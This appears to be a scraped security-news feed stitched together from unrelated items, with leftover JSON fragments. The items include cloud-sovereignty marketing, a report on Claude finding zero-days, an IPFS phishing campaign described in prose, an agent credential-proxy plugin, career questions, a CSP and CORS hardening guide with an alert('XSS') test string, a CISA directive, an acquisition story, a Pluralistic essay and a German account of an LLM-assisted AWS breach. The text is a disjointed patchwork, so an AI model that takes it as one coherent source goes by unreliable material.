service provider to eliminate transfer fees and introduced tools to make such transfers easier. We continue to proactively advocate against restrictive cloud licensing policies that lock in cloud customers, harm economic growth, and stifle innovation. We are the only major cloud provider that enables customers to deny access to their unencrypted data for any reason. We offer the ability to require approval before specific administrative activity occurs along with a mechanism for customers to ensure their approvals are legitimate. Capabilities like these help ensure that customers are the ultimate arbiters of access to their data on Google Cloud. Our External Key Management solution enables customers to encrypt their data at rest with keys stored outside our cloud. It requires detailed justifications each time access to their keys is requested. Google Cloud will challenge overbroad and unlawful data requests, and seek appropriate judicial remedies. We are fully committed to ensuring that legal requests are subject to transparency, and report these out to the public through our Transparency Report . Sovereign Cloud from Google provides customers with controls that are designed to facilitate the processing and storage of customer data in a given region, protected by local laws. This extends to Google Workspace, where client-side encryption ensures that your collaboration data is indecipherable to Google, keeping your emails, documents, and meetings strictly under your control. We recognize that data residency alone often isn't enough — you need assurance that the actual machine-learning processing occurs in your required jurisdiction. We recently expanded our local ML processing commitments for select Gemini models to Australia, Brazil, Canada, France, Germany, India, Japan, Singapore, South Korea, and the U.K. We are continuously expanding our data residency commitments across the globe. Innovating without limits A sovereign digital future should be grounded in choice, encouraging the freedom to use the best tools without being tied to a single vendor. Many Google solutions you have come to love, such as Android, Chrome, Kubernetes, and Gemma, are built on open technology, giving developers, businesses, and governments common tools that work everywhere. We are fundamentally committed to an open digital world, building on open-source technology. We provide unmatched choice through Vertex AI, our AI development platform for building and using generative AI. Vertex AI enables you to develop, tune, and deploy your own models, or you can use and localize Google’s leading models, like Gemini and Gemma. We also provide tools so you can build custom agents, or you can use Google’s pre-built agents to accelerate your time to market. Get started today Our commitments to verifiable control, assured resilience, local investments, and open choice are our pledge to help build a digital future that is innovative, secure, and truly sovereign.

    "summary": "Anthropic only released its latest large language model, Claude Opus 4.6, on Thursday, but it has already been using it behind the scenes to identify zero-day vulnerabilities in open-source software. In the trial, it put Claude inside a virtual machine with access to the latest versions of open source projects, and provided it with a range of standard utilities and vulnerability analysis tools, but no instructions on how to use them nor how specifically to identify vulnerabilities. Despite this lack of guidance, Opus 4.6 managed to identify a 500 high-severity vulnerabilities. Anthropic staff are validating the findings before reporting the bugs to their developers to ensure the LLM was not hallucinating or reporting false positives, according to company blog post . “AI language models are already capable of identifying novel vulnerabilities, and may soon exceed the speed and scale of even expert human researchers,” it said. Anthropic may be keen to improve its reputation in the software security industry, given how its software has already been used to automate attacks . Other companies are already using AI to handle bug hunting and this is further evidence of the possibilities. But some software developers are overwhelmed by the number of poor-quality AI-generated bug reports, with at least one shutting its bug-bounty program because of abuse by AI-accelerated bug hunters.",

The emails in this phishing campaign don’t attach a document directly but include links to a file hosted on IPFS (InterPlanetary File System), a decentralized storage network increasingly used by cybercriminals as it can be accessed through normal web gateways. Those files are virtual hard disks that, when opened, mount as a local disk, bypassing some Windows security features. Inside the disk is a Windows Script File (WSF) purporting to be the expected PDF: When the user opens it, Windows executes the code in the file thus leaving the computer open to exploitation by remote users.

I figured this is best served as a separate project since the beauty of OpenClaw is that, well, everything goes. But that reason why it is this popular is also its problem. I would love to get your take. If you're running OpenClaw, all your API keys and channel tokens live in the same process as the agent. That means a compromised agent (or a badly behaved tool) could in theory have direct access to your keys. Currently playing with an OpenClaw plugin that moves all credentials into a separate proxy process. The Gateway only sees localhost:8081 as its API endpoint. The proxy looks up the real key from your keychain or vault, injects it into the request, and forwards it upstream. The agent never touches the actual credential. Once installed, the plugin also intercepts globalThis.fetch so channel traffic (Telegram, Slack, Discord, Twilio, MS Teams, etc.) gets routed through the proxy too — no code changes needed in your existing setup. It's 3 npm packages but there is also a Docker setup in the repository. Link: https://github.com/tech4242/aquaman submitted by /u/tech4242 [link] [comments]",

At this moment the technical part works fine, we use different tools to audit certain environments (like M365, onprem, network etc.) However the organizational process around it is messy and inconsistent (planning, documentation, handovers, reporting, etc.). A lot of things are tracked inExcel files and SharePoint folders, which leads to confusion and differences in approach depending on who runs the project. I’m looking for best practices or frameworks on how to manage the full pentest lifecycle, including: Sales / intake / quoting Scoping + rules of engagement Planning + scheduling resources Kickoff + communication with client Execution phase Tracking findings consistently Reporting + QA/review Delivery + presentation Retesting Closing + archiving Metrics / improvement loop How do you run pentests like a repeatable service with a consistent workflow?

    "summary": "Hello guys, my first question here. I am currently taking the SOC analyst path on HTB for their CDSA exam. I am originally a Penetration Tester with 2 local but strong certifications in general pentesting and AD pentesting. I also have a side job (more like a mentorship) where I engage in pentesting and report writing for real-life clients. So, as I am working in that Red Team, I am learning as well. But my current main job is more of a generalist kind of job; it pays well, but I have to do both blue and some red teaming activities later on. I want to grow very fast in the industry I got this job in (Oil and Gas). Now my actual question is, with cost in mind, isn't the CDSA going to teach me enough Incident handling skills? Can't I go straight to the GIAC GCFA after this? Because, per my research, most people say the GCIH course teaches you more offense, so you'd defend better. I already know a ton of offensive tools, and I'm already building SOC skills. What I need next is to be better at threat-hunting and intelligence. Any thoughts are welcome. Thank you.

    "title": "Starfish Space uses Google Cloud to accelerate satellite servicing in orbit",
    "summary": "The Defense Industrial Base (DIB) and Federal System Integrator (FSI) communities operate under intense pressure. The mandate is clear: do more, faster, and with greater efficiency. As the engine of our national security and public sector services, these organizations must constantly innovate to maintain technological superiority. At Google Public Sector, we see firsthand how cloud technology accelerates this mission, providing the reliable, scalable infrastructure necessary to turn ambitious concepts into on-orbit realities. A software-first approach to orbital complexities A prime example of this innovation is Starfish Space, a startup pioneering a software-first approach to satellite servicing. Historically, satellite servicing—docking with and servicing satellites in orbit—has been the domain of massive government programs involving heavy, hardware-intensive vehicles. This approach made scaling difficult and expensive, limiting what humanity could accomplish in space. Starfish Space is changing this paradigm with \" Otter ,\" a small, versatile satellite servicing vehicle designed to extend satellite lifetimes and provide end-of-life disposal. However, building an autonomous vehicle capable of docking with a satellite traveling faster than a speeding bullet requires a new approach to satellite software development. It requires rigorous testing not just in a physical lab, but in a digital one. Scaling simulations with managed Kubernetes To achieve this, Starfish Space selected Google Cloud as its strategic provider for cloud infrastructure. To support the development of autonomous software capable of satellite docking, Starfish Space needed to run massive-scale Monte Carlo simulations to train the software in a virtual orbital environment. Leveraging the scalability of Google Compute Engine and Google Kubernetes Engine (GKE), Starfish Space executes millions of complex simulations with speed and confidence. This illustrates the power of managed Kubernetes: the ability to spin up massive compute resources for demanding workloads, and scale them back down just as quickly to control costs. This infrastructure allows Starfish Space engineers to iterate rapidly, testing their software against countless edge cases that could occur in orbit without the capital expenditure of on-premise hardware. Our goal is to make satellite servicing affordable and available, and that requires a fundamentally different, software-first approach. Google Cloud provides the scalable, high-performance computing infrastructure we need to run millions of simulations with speed and confidence. Austin Link, Co-Founder, Starfish Space Turning digital validation into orbital success Starfish Space has secured Otter mission contracts with NASA, the U.S. Space Force, SES, and the Space Development Agency. Following the launch of their Otter Pup demonstration satellites, the company is preparing to launch the first full Otter satellites this year to begin providing commercial services. Google Public Sector helps organizations accelerate their most critical missions. By leveraging commercial cloud infrastructure for high-performance computing and simulation, organizations like Starfish Space can reduce the cost of development, accelerate timelines, and deliver capabilities that support critical missions.

Do security teams review script behavior after deployment? Has anyone actually removed tools after discovering unexpected data access? (like unexpected keyloggers) Yes, 99% of the time those scripts will be harmless. That’s why security teams don’t spend much time on them. And that’s why attackers target them.

However, even though this experiment is interesting, it really shows the state of security for modern development. The founder of Moltbook publicly admitted, that he had vibe coded the entire platform, which caught the attention of security researchers world wide. Shortly after, researchers at Wiz found an exposed Supabase API Key within minutes. Not by using state-of-the-art tolling, but by simply using the browser dev tools (anyone knowing about the Inspect Button in chrome could've found it). This key gave full read / write access to the production database. After I heard about this, I had to conduct my own research. So I setup an AI Agent to investigate. Within just 3 minutes it found an Overly Permissive CORS Policy, Weak Content Security Policy and Missing Security Headers, which lead to dynamic code execution, session hijacking, stealing user data and posting behalf of the users. This is a pattern you can observe on most vibe coded projects. If you want to get protected against these, make sure your application includes the following things: Setup a Secret Scanner like Truffle Hog ( https://github.com/trufflesecurity/trufflehog ). It's easy to use and setup and brings in a lot of value. Do yourself a favour and set it up for every project you work in. A leaked API key is really the last thing anyone could want. - Make sure to set your CORS Policy right. This 'access-control-allow-origin: *' is super common for vibe coded applications, but please make sure to change it to something like this: access-control-allow-origin: https://www.moltbook.com access-control-allow-methods: GET, POST, OPTIONS access-control-allow-headers: Content-Type, Authorization, X-API-Key access-control-allow-credentials: true Access-Control-Max-Age: 86400 This ensures that only your actual website can talk to your API. It prevents a malicious site (e.g., evil-site.com) from making requests to your API using a victim's logged-in session to steal their data or post on their behalf. Make sure to not use 'unsafe-inline' and 'unsafe-eval'. Again, very common in vibe coded projects. This allows attackers to add and execute JavaScript code. To remediate do the following: a) Setup a Middleware and add this: function generateNonce() { return Buffer.from(crypto.randomBytes(16)).toString('base64'); } app.use((req, res, next) => { const nonce = generateNonce(); res.set('Content-Security-Policy', ' default-src 'self'; script-src 'self' '${nonce}' 'strict-dynamic'; style-src 'self' '${nonce}'; img-src 'self' data: https: blob:; connect-src 'self' https: wss:; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; '); next(); }); This treats every request, as a new, single request. b) Update the HTML to Use the Nonce: alert('XSS') alert('Safe') c) Add CSP Reporting app.post('/csp-violation-report', express.json(), (req, res) => { console.error('CSP Violation:', req.body); res.status(204).send(); }); Make sure to add critical security headers. I would say this is really the most common vibe coding mistake. I cannot remember a vibe coded project where I haven't found one of these. e.g. Add HttpOnly, Secure and SameSite=Strict flags to your Cookie Security Header. Validate for X-Forwarded Host, etc. Check this page to see which headers need to be set and how: https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html For everyone vibe coding out there. This is great. Please keep doing it. Vibe Coding is really one of the greatest things that could have come up. But please keep in mind: speed is no excuse for insecurity. Vibe Code, but Verify.

    "summary": "I’m working on building a control-centric compliance / governance model using Secure Control Framework (SCF), and I’m starting to question whether what I’m doing is correct or unnecessarily complex . The idea is not to do compliance standard by standard (ISO, PCI, SOC, etc.), but to: Start from a single control framework (Secure Controls Framework – SCF) Scope only relevant controls and use it further for assessments. On paper, this aligns with Integrated Controls Management (ICM) and makes sense conceptually. But in practice, it feels… huge . For example: Some SCF controls are very high-level (“Mechanisms exist to manage assets”) Others are very prescriptive (“Review configs at least annually”) Deciding whether things like frequency belong in: the control itself maturity definitions or separate parameters feels like a design choice that affects the whole system I’m also constantly second-guessing: Am I missing controls? Am I over-interpreting frameworks? Is defining “expected behavior” per control normal, or am I reinventing things? I’m doing this mostly solo, trying to build something sustainable, defensible, and ops-friendly, but the scope feels vast and sometimes overwhelming. Question to the community: Is a control-centric model like this the right way to manage multi-standard compliance? How do you avoid analysis paralysis when frameworks are intentionally abstract? At what point do you stop refining and say “this is good enough”? Would love perspectives from anyone who’s built or operated a GRC / control framework in real life... submitted by /u/Odd-Ad-923 [link] [comments]",

    "title": "CISA gives federal agencies 18 months to purge unsupported edge devices",
    "summary": "The Cybersecurity and Infrastructure Security Agency has given federal agencies 18 months to remove all end-of-support edge devices from their networks, escalating its response to what security researchers describe as a fundamental shift in nation-state attack tactics, where attackers exploit network infrastructure rather than endpoints. The binding operational directive , BOD 26-02, requires Federal Civilian Executive Branch (FCEB) agencies to inventory, update where possible, and ultimately replace firewalls, routers, VPN gateways, load balancers, and network security appliances that no longer receive vendor security patches. CISA warned that the threat from these unsupported devices is “substantial and constant.” “Unsupported devices pose a serious risk to federal systems and should never remain on enterprise networks,” CISA Acting Director Madhu Gottumukkala said in the directive. The directive requires FCEB agencies to immediately update any edge device running outdated software to vendor-supported versions where possible. Within three months, agencies must inventory all end-of-support devices using CISA’s EOS Edge Device List and report findings. Within 12 months, agencies must begin removing devices that have reached end-of-support dates. The 18-month deadline requires all unsupported edge devices to be permanently removed and replaced. Why edge devices became prime targets “Edge devices differ fundamentally from traditional IT assets, as they are often end of support, custom, OEM and process dependent,” Avinash Dev Nagumanthri, director analyst at Gartner, told CSO. “This makes discovery, patching, and replacement difficult under tight budgets while maintaining uptime.” Network edge devices have become one of the top initial access vectors for state-affiliated cyberespionage groups and ransomware gangs. Research shows a dramatic increase in edge device exploitation, with network edge vulnerabilities seeing an 8x increase in exploitation activity. The 2025 Mandiant M-Trends report found that 21% of ransomware attacks featured vulnerability exploitation as the initial access vector. CISA has documented nation-state campaigns targeting devices from Cisco, Fortinet, Palo Alto Networks, Ivanti, Juniper, and other vendors. The agency noted that these devices have become attractive targets because of their position at the network boundary, integration with identity management systems, and privileged access for lateral movement. Once compromised, they enable threat actors to intercept network traffic, harvest credentials, and exfiltrate sensitive data while evading traditional endpoint detection. Nagumanthri noted that edge devices protecting critical infrastructure can have physical impacts when compromised, putting high-value systems in sectors like water and transportation at risk. “Nation-state actors are increasingly exploiting edge devices as entry points into infrastructure, threatening critical private sector operations.” The directive follows two recent emergency directives. In September, CISA issued Emergency Directive 25-03 after threat actors exploited zero-day vulnerabilities in Cisco Adaptive Security Appliances, deploying persistent malware that survived reboots. In October, another emergency directive followed the compromise of F5 Networks’ development environment, where attackers exfiltrated BIG-IP source code. Implementation hurdles Sunil Varkey, advisor at Beagle Security, warns of implementation complexities. “The operational reality of removing legacy systems is not straightforward,” Varkey said. “Legacy devices continue to exist not by design, but by necessity.” He pointed to orphaned systems that remain live and embedded in workflows but lack clear ownership, and operational technology environments where newer hardware or software versions are not available, compatible, or certified. The process requires asset discovery, risk assessment, procurement, configuration redesign, data migration, testing, and managed cutovers to avoid service disruption. “A common challenge will be the presence of ‘orphaned’ or ‘ghost’ systems — devices that are live, embedded in workflows, but no longer clearly owned,” Varkey said. “These systems often persist because ‘they’ve always worked,’ even when no one fully understands their function.” Private sector implications While the directive applies only to federal civilian agencies, CISA strongly encourages private sector organizations to adopt similar measures. The exploitation campaigns targeting federal networks pose equivalent risks to critical infrastructure and commercial enterprises. Nagumanthri recommended that organizations treat edge and cyber-physical systems as Tier-0 assets, enforce strong authentication, implement network segmentation, require vendor-supported firmware updates, and centralize logging to limit blast radius. For the private sector, he advocated structured lifecycle management with secure-by-design hardware, continuous monitoring, and controlled updates with rollback capabilities. Varkey saw the directive as a catalyst for modernization beyond compliance. “While the short-term impact will be challenging, the outcome is a more secure, accountable, and defensible infrastructure — one better aligned with today’s threat realities and tomorrow’s operational needs.”",

I was really good i think(i'd do some threat hunting on end user platforms), the critical servers where on a different AVs so the logs didnt go to defender platform. External SOC used a different SIEM(i didnt like the language so i only actioned the threat report they sent )... I'd join devsecops meetings, single managing the email gateway(mimecast), doing onboarding of security platforms and enjoyed the vulnerability management software we brought. The mimecast support was excellent as the success manager ensured i wasn't lagging behind and i did deliver cause getting arounf tuning policies and understanding dmarc spf and all that bull was pretty neat. Anyhoo i figured i was pretty weak in network operations and i am now lucky to have joined a media company as an infra engineer as a network engineer. I'm allowed to go into switches, firewalls and all that jazz just doing the simple vlan changes and undergoing a LAN refresh so i guess i'm lucky here. My manager has said i can progress alot in network security if thats my aim.

    "title": "Zscaler extends zero-trust security to browsers with SquareX acquisition",
    "summary": "Cloud security company Zscaler has announced the acquisition of SquareX, a Singapore-based browser detection and response (BDR) technology startup. The deal will enable Zscaler to extend its Zero Trust Exchange capabilities directly into standard web browsers, across both managed and unmanaged devices. With Zscaler Private Access (ZPA), the company has been assisting enterprises adopt zero trust architecture using a lightweight agent. The SquareX acquisition is expected to further strengthen Zscaler’s ability to deliver security directly within commonly used browsers through lightweight extensions, eliminating the need for a separate enterprise browser . The acquisition will assist in enabling posture-like security and protection against advanced spear-phishing and identity-based attacks right into the user’s existing workflow, stated Jay Chaudhry, CEO, chairman, and founder of Zscaler, in his LinkedIn post. Browsers, the new frontier for attacks Traditionally treated as a mere gateway to the internet, web browsers are now at the center of enterprise activity, being widely used for SaaS applications, cloud services, and increasingly for generative AI tools. As employees upload, copy, and share sensitive data through browser sessions, this growing reliance has also opened new avenues for security risks. “Most security stacks protect either the application, the endpoint, or the network. The browser is, unfortunately, the blind spot in between. There are traditional ways of dealing with the issue, but often at too great a risk, or as a result of too limiting an approach,” said Devroop Dhar, co-founder and MD at Primus Partners. SquareX assists by allowing any browser on any device to function more like a secure enterprise browser using a lightweight, extension-based approach. “This extension becomes a kind of runtime enforcement agent, offering session-specific controls such as browser-based DLP, dynamic content isolation, real-time monitoring of user behaviour, and targeted security enforcement depending on risk levels and session context,” said Sanchit Vir Gogia, CEO and chief analyst at Greyhound Research. SquareX’s approach also blocks sensitive data from being pasted into public AI tools, flags suspicious prompts, or limits interactions based on user role and data sensitivity, Dhar said. This is so important because AI misuse is rarely malicious, it is accidental. Browser-native security is better suited to prevent mistakes before they turn into incidents. SquareX extension-based security can be integrated with most commonly used web browsers, including Chrome, Edge, Firefox and Safari, allowing employees to continue using their preferred browser without requiring enterprises to deploy or manage yet another dedicated security tool. A win-win for customers? Zscaler has acknowledged that browser runtime behaviour was a missing piece in its zero-trust security, and having SquareX solution in its portfolio can help fill the gap, noted Gogia. For Zscaler customers, this acquisition would mean browser security is no longer an afterthought or a separate tool to evaluate but a native part of the platform. “It reduces reliance on legacy access methods like VPN and VDI, especially for external users. It also gives Zscaler the ability to unify policy enforcement across network access, app usage, and now browser behaviour. Zscaler customers will be able to apply in-session controls to activities that were previously invisible, such as clipboard actions, extension behaviour, or AI prompt submission. They also gain options for session isolation, file download inspection, and least-privilege app access via browser,” added Gogia. On the other hand, for SquareX customers, this means scale and integration. Vivek Ramachandran, founder and CEO of SquareX, confirmed in a blog post that customer deployments and investments will be protected, and over time, they will benefit from tighter integration with Zscaler services, expanded analytics, and more robust, risk-based controls across managed and unmanaged devices. In both instances, the customer benefits from improved alignment between access, behaviour, and enforcement approaches, stated Dhar. Different roads to browser security Of late, leading cybersecurity companies have been strengthening their product portfolios by investing in and acquiring specialized browser security firms. This is an indication that they now see browser-native security as strategic rather than optional. For instance, in January this year, CrowdStrike acquired Israel-based Seraphic Security, a browser runtime security company, which it plans to integrate into the Falcon platform. For CISOs, the concern has shifted from the security of the browser to where the security of the browser should be located. Dhar explained in the case of Zscaler’s move with SquareX, the strategy is to integrate browser controls with its access component of Zscaler zero trust. That’s security beyond granting access. However, in the case of the acquisition by CrowdStrike involving Seraphic, the strategy falls under endpoint security as they extend the visibility of EDR solutions to include the browser.",

Having an MDR that actually handles this direct verification would be great. Some services ping users on Slack or Teams right? We need to discover missing context at scale with or without agentic AI.

    "title": "Pluralistic: Luxury Kafka (06 Feb 2026)",
    "summary": "Today's links Luxury Kafka: US Immigration on the easiest setting. Hey look at this: Delights to delectate. Object permanence: Whisky PC; Anitfeatures; Silicon Roundabout; Steampunk Etch-A-Sketch; MLMs as mirror-world organizers. Upcoming appearances: Where to find me. Recent appearances: Where I've been. Latest books: You keep readin' em, I'll keep writin' 'em. Upcoming books: Like I said, I'll keep writin' 'em. Colophon: All the rest. Luxury Kafka (permalink) Having been through the US immigration process (I got my first work visa more than 25 years ago and became a citizen in 2022), it's obvious to me that Americans have no idea how weird and tortuous their immigration system is: https://www.flickr.com/photos/doctorow/52177745821/ As of a couple years ago, Americans' ignorance of their own immigration system was merely frustrating, as I encountered both squishy liberals and xenophobic conservatives talking about undocumented immigrants and insisting that they should \"just follow the rules.\" But today, as murderous ICE squads patrol our streets kidnapping people and sending them to concentration camps where they are beaten to death or deported to offshore slave labor prisons, the issue has gone from frustrating to terrifying and enraging. Let's be clear: I played the US immigration game on the easiest level. I am relatively affluent – rich enough to afford fancy immigration lawyers with offices on four continents – and I am a native English speaker. This made the immigration system ten thousand times (at a minimum) easier for me than it is for most US immigrants. There are lots of Americans (who don't know anything about their own immigration system) who advocate for a \"points-based\" system that favors rich people and professionals, but America already has this system, because dealing with the immigration process costs tens of thousands of dollars in legal fees, and without a lawyer, it is essentially unnavigable. Same goes for Trump's \"Golden Visa\" for rich people – anyone who can afford to pay for one of these is already spending five- or six-figure sums with a white shoe immigration firm. I'm not quite like those people, though. The typical path to US work visas and eventual immigration is through a corporate employer, who pays the law firm on your behalf (and also ties your residency to your employment, making it risky and expensive to quit your job). I found my own immigration lawyers through a friend's husband who worked in a fancy investment bank, and it quickly became apparent that immigration firms assume that their clients have extensive administrative support who can drop everything to produce mountains of obscure documents on demand. There were lots of times over the years when I had to remind my lawyers that I was paying them, not my employer, and that I didn't have an administrative assistant, so when they gave me 48 hours' notice to assemble 300 pages of documentation (this happened several times!), it meant that I had to drop everything (that is, the activities that let me pay their gigantic invoices) to fulfill their requests. When you deal with US immigration authorities, everything is elevated to the highest possible stakes. Every step of every process – work visa, green card, citizenship – comes with forms that you sign, on penalty of perjury, attesting that you have made no mistakes or omissions. A single error constitutes a potential falsification of your paperwork, and can result in deportation – losing your job, your house, your kid's schooling, everything. This means that, at every stage, you have to be as comprehensive as possible. This is a photo of my second O-1 (\"Alien of Extraordinary Ability\") visa application. It's 800 pages long: https://www.flickr.com/photos/doctorow/2242342898/ The next one was 1200 pages long. Like I say, I became a citizen in 2022 (for some reason, my wife got her citizenship in 2021, even though we applied jointly). At that point, I thought I was done with the process. But then my kid applied to university and was told that she should sign up for FERPA, which is the federal student loan and grant process; she got pretty good grades and there was a chance she could get a couple grand knocked off her tuition. Seemed like a good idea to me. So we filled in the FERPA paperwork, and partway through, it asks if you are a naturalized citizen, and, if you are, it asks you to upload a copy of your certificate of citizenship. My wife and I both have certificates, but the kid doesn't – she was naturalized along with my wife in 2021, and while my wife's certificate was sufficient to get our daughter a passport, it doesn't actually have the kid's name on it. I checked in with our lawyers and was told that the kid couldn't get her certificate of citizenship until she turned 18, which she did last Tuesday. My calendar reminded me that it was time to fill in her N-600, the form for applying for a certificate of citizenship. So yesterday, I sat down at the computer, cleared a couple hours, and went to work. I am used to gnarly bureaucratic questions on this kind of paperwork, and I confess I get a small thrill of victory whenever I can bring up an obscure document demanded by the form. For example: I was able to pull up the number of the passport our daughter used to enter the country in 2015, along with the flight number and date. I was able to pull up all three of the numbers that the US immigration service assigned to both my wife and me. And then, about two hours into this process, I got to this section of the form: \"U.S. citizen mother or father's physical presence.\" This section requires me to list every border crossing I made into the USA from the day I was born until the date I became a citizen. That includes, for example, the time when I was two years old and my parents took me to Fort Lauderdale to visit my retired grandparents. This question comes after a screen where you attest that you will not make any omissions or errors, and that any such omission or error will be treated as an attempt to defraud the US immigration system, with the most severe penalties imaginable. I tried to call the US immigration service's info line. It is now staffed exclusively by an AI chatbot (thanks, Elon). I tried a dozen times to get the chatbot to put me on the phone with a human who could confirm what I should do about visits to the US that I took more than 50 years ago, when I was two years old. But the chatbot would only offer to text me a link to the online form, which has no guidance on this subject. Then I tried the online chat, which is also answered by a chatbot. This chatbot only allows you to ask questions that are less than 80 characters long. Eventually, I managed to piece together a complete conversation with the chatbot that conveyed my question, and it gave me a link to the same online form. But there is an option to escalate the online chat from a bot to a human. So I tried that, and, after repeatedly being prompted to provide my full name and address (home address and mailing address), date of birth, phone number – and disconnected for not typing all this quickly enough – the human eventually pasted in boilerplate telling me to consult an immigration attorney and terminated the chat before I could reply. Just to be clear here: this is immigration on the easiest setting. I am an affluent native English speaker with access to immigration counsel at a fancy firm. Imagine instead that you are not as lucky as I am. Imagine that your parents brought you to the USA 60 years ago, and that you've been a citizen for more than half a century, but you're being told that you should carry your certificate of citizenship if you don't want to be shot in the face or kidnapped to a slave labor camp. Your parents – long dead – never got you that certificate, so you create an online ID with the immigration service and try to complete form N-600. Do you know the date and flight number for the plane you flew to America on when you were three? Do you know your passport number from back then? Do you have all three of each of your dead parents' numeric immigration identifiers? Can you recover the dates of every border crossing your parents made into the USA from the day they were born until the day they became citizens? Anyone who says that \"immigrants should just follow the rules\" has missed the fact that the rules are impossible to follow. I get to do luxury Kafka, the business class version of US immigration Kafka, where you get to board first and nibble from a dish of warm nuts while everyone else shuffles past you, and I've given up on getting my daughter's certificate of citizenship. The alternative – omitting a single American vacation between 1971 and 2022 – could constitute an attempt to defraud the US immigration system, after all. This was terrible a couple years ago, when the immigration system still had human operators you could reach by sitting on hold for several hours. Today, thanks to a single billionaire's gleeful cruelty, the system is literally unnavigable, \"staffed\" by a chatbot that can't answer basic questions. A timely reminder that the only jobs AI can do are the jobs that no one gives a shit about: https://pluralistic.net/2025/08/06/unmerchantable-substitute-goods/#customer-disservice It's also a timely reminder of the awesome destructive power of a single billionaire. This week, I took a Southwest flight to visit my daughter at college for her 18th birthday, and of course, SWA now charges for bags and seats. Multiple passengers complained bitterly and loudly about this as they boarded (despite the fact that the plane was only half full, many people were given middle seats and banned from moving to empty rows). One woman plaintively called out, \"Why does everything get worse all the time?\" (Yes, I'm aware of the irony of someone saying that within my earshot): https://pluralistic.net/2024/10/14/pearl-clutching/#this-toilet-has-no-central-nervous-system Southwest sucks today because of just one guy: Paul Singer, the billionaire owner of Elliott Investment Management, who bought a stake in SWA and used it to force the board to end open seating and free bag-check, then sold off his stake and disappeared into the sunset, millions richer, leaving behind a pile of shit where a beloved airline once flew: https://www.forbes.com/sites/suzannerowankelleher/2024/10/24/southwest-airlines-bends-to-activist-investor-restructures-board/ One guy, Elon Musk, took the immigration system from \"frustrating and inefficient\" to \"totally impossible.\" That same guy is an avowed white nationalist – and illegal US immigrant who did cheat the immigration system – who sadistically celebrates the unlimited cruelty the immigration system heaps on other immigrants: https://www.congress.gov/119/meeting/house/118277/documents/HHRG-119-JU13-20250520-SD003.pdf Again: I've got it easy. The people they want to put in concentration camps are doing something a million times harder than anything I've had to do to become a US citizen. People sometimes joke about how Americans couldn't pass the US citizenship test, with its questions about the tortured syntax of the 10th Amendment and the different branches of government. But the US citizenship test is the easy part. That test sits at the center of a bureaucratic maze that no American could find their way through. Hey look at this (permalink) The Big Idea: Justin C.

    "title": "KI als AWS-Angriffsturbo",
    "summary": "Kriminelle Hacker haben ihre Angriffe auf AWS-Umgebungen mit KI beschleunigt. khunkornStudio – shutterstock.com Forscher des Sicherheitsanbieters Sysdig haben einen Angriff aufgedeckt, bei dem kriminelle Angreifer eine AWS-Umgebung in weniger als acht Minuten vollständig kompromittieren konnten. Laut den Threat-Spezialisten nutzten die Bedrohungsakteure dabei eine Cloud-Fehlkonfiguration mit der Hilfe von Large Language Models (LLMs) aus, um den gesamten Angriffs-Lebenszyklus zu komprimieren – von Stunden auf wenige Minuten. „Sich gegen Angriffe dieser Art zu verteidigen, erfordert KI-fokussierte Technologien, die in der Lage sind Schlussfolgerungen zu ziehen und es ermöglichen, auf automatisierte Attacken mit der nötigen Geschwindigkeit zu reagieren“, meint Ram Varadarajan , CEO beim Plattformanbieter Acalvio. Vom Public Bucket zur Privilege Escalation Initial konnten sich die Cyberkriminellen laut den Sicherheitsforschern Zugriff verschaffen, indem sie gültige AWS-Anmeldedaten nutzten, die zuvor in öffentlichen S3Buckets offengelegt wurden. Diese enthielten auch KI-bezogene Daten, etwa Berechtigungen für die Interaktion mit Lambda und eingeschränkten Zugriff auf Amazon Bedrock. „Dieser Benutzer wurde wahrscheinlich mit der Intention erstellt, Bedrock-Tasks mit Lambda-Funktionen in der gesamten Umgebung zu automatisieren“, erklären die Sysdig-Forscher. Mit Lesezugriff auf die gesamte Umgebung hatten die Angreifer dann auch leichtes Spiel damit, sich einen Überblick über alle verfügbaren AWS-Dienste zu verschaffen und ihre Berechtigungen zu erweitern, indem sie eine existierende Lambda-Funktion modifizierten. Wie die Analyse der Sicherheitsforscher zeigt, weist der Lambda-Code Anzeichen auf, die darauf hindeuten, dass er per LLM generiert wurde , darunter ein umfassendes Exception Handling iterative Targeting-Logik und nicht-englische Kommentare. Laterale Bewegung, LLMjacking und GPU-Missbrauch Nachdem sich die Angreifer administrativen Zugriff verschafft hatten, bewegten sie sich lateral über 19 verschiedene AWS-Principals und erstellten neue Benutzerkonten, um ihre Aktivitäten auf verschiedene Identitäten zu verteilen. Dieser Ansatz ermöglichte den Angreifern Persistenz und erschwerte parallel die Detection, wie die Forscher in ihrem Bericht festhalten. Anschließend verlagerten die Hacker ihren Fokus auf Amazon Bedrock, ermittelten die verfügbaren Modelle und deaktivierten die Protokollierung von Modellaufrufen. Laut den Forschern wurden dann mehrere Foundation-Modelle aufgerufen , entsprechend dem Muster von „ LLMjacking “. Zudem verwies der Code in Teilen auch auf nicht existierende Repositories und Ressourcen, was Sysdig auf LLM-Halluzinationen zurückführt. Im Anschluss missbrauchten die Angreifer schließlich auch noch Ressourcen. Demnach versuchten die Angreifer, High-End-GPU-Instanzen für Machine-Learning-Workloads zu starten. Während das bei den meisten Instanzen aufgrund von Kapazitätsbeschränkungen fehlschlug, konnten die Cyberkriminellen allerdings eine besonders kostspielige GPU-Instanz starten – inklusive Skripten, um CUDA zu installieren, Trainings-Frameworks bereitzustellen und ein öffentliches JupyterLab-Interface zu exponieren. Experten zufolge ist das Beunruhigendste an diesem Angriff nicht, dass KI eine neue Angriffstechnik ermöglicht hat. „Wenn man diesen Angriff auf das Wesentliche reduziert, ist das bahnbrechende nicht die Technik“, betont etwa Shane Barney , CISO bei Keeper Security. „Entscheidend ist die geringe Widerstandsfähigkeit der Umgebung, sobald der Angreifer legitimen Zugriff erhalten hat.“ Der Sicherheitsentscheider warnt davor, dass KI Reconnaissance, Privilege Testing und laterale Bewegungen durch das Netzwerk in einer besonders schnellen Sequenz komprimiert. Hierdurch werde die Pufferzeit, auf die sich die Verteidiger bislang traditionell verlassen hätten, eliminiert. Um das Risiko solcher Attacken zu verringern, empfehlen die Sysdig-Forscher, das Least-Privilege-Prinzip konsequent auf sämtliche IAM-Benutzer- und Lambda-Execution-Rollen anzuwenden. Darüber hinaus sollten sensible S3-Buckets niemals öffentlich zugänglich sein, warnt Sysdig. Die Research-Experten legen Unternehmen außerdem ans Herz die Lambda-Versionierung zu nutzen, die Protokollierung der Modellaufrufe in Bedrock zu aktivieren, und verdächtige, großangelegte Enumeration-Aktivitäten kritisch zu überprüfen.

